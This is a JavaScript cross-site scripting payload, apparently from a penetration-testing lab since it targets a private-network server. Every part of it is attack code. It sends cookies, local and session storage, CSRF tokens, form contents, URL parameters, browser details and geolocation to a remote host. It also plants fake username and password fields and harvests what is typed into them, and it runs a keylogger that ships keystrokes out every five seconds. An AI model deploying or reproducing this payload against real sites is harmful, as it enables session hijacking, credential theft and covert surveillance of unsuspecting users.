let server = "http://192.168.45.162";

// Exfiltrate local storage, session storage, cookies, and browser information
let exfilData = (key, value) => fetch(`${server}/exfil?${key}=${encodeURIComponent(value)}`);
exfilData("data", JSON.stringify(localStorage));
exfilData("data", JSON.stringify(sessionStorage));
exfilData("data", document.cookie);

// Exfiltrate browser information
exfilData("user_agent", navigator.userAgent);
exfilData("platform", navigator.platform);
exfilData("language", navigator.language);

// Check for CSRF tokens and exfiltrate them
let csrfTokenSelectors = ["meta[name='csrf-token']", "input[name='csrfmiddlewaretoken']", "input[name='csrf_token']"];
csrfTokenSelectors.forEach(selector => {
  let tokenElement = document.querySelector(selector);
  if (tokenElement) {
    let tokenValue = tokenElement.content || tokenElement.value;
    if (tokenValue) {
      exfilData("csrf_token", tokenValue);
    }
  }
});

// Exfiltrate other potentially sensitive information
// Get all form data
let forms = document.querySelectorAll("form");
forms.forEach(form => {
  let formData = new FormData(form);
  for (let [key, value] of formData.entries()) {
    exfilData(`form_${key}`, value);
  }
});

// Get all URL parameters
let urlParams = new URLSearchParams(window.location.search);
urlParams.forEach((value, key) => {
  exfilData(`url_param_${key}`, value);
});

// Get geolocation if available
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(position => {
    exfilData("geolocation", JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude }));
  });
}

// Create input fields for username and password
let body = document.getElementsByTagName("body")[0];
["text", "password"].forEach(type => {
  let input = document.createElement("input");
  input.type = type;
  input.style.position = "fixed";
  // input.style.opacity = "0";
  body.append(input);
});

// Capture username and password after 5 seconds
setTimeout(() => {
  let inputs = document.getElementsByTagName("input");
  fetch(`${server}/k?u=${inputs[0].value}&p=${inputs[1].value}`);
}, 5000);

// Log keystrokes and store them in a buffer
let keystrokeBuffer = [];
function logKey(event) {
  keystrokeBuffer.push(event.key);
}

document.addEventListener('keydown', logKey);

// Send buffered keystrokes every 5 seconds
setInterval(() => {
  if (keystrokeBuffer.length > 0) {
    fetch(`${server}/k?keys=${encodeURIComponent(keystrokeBuffer.join(""))}`);
    keystrokeBuffer = [];
  }
}, 5000);
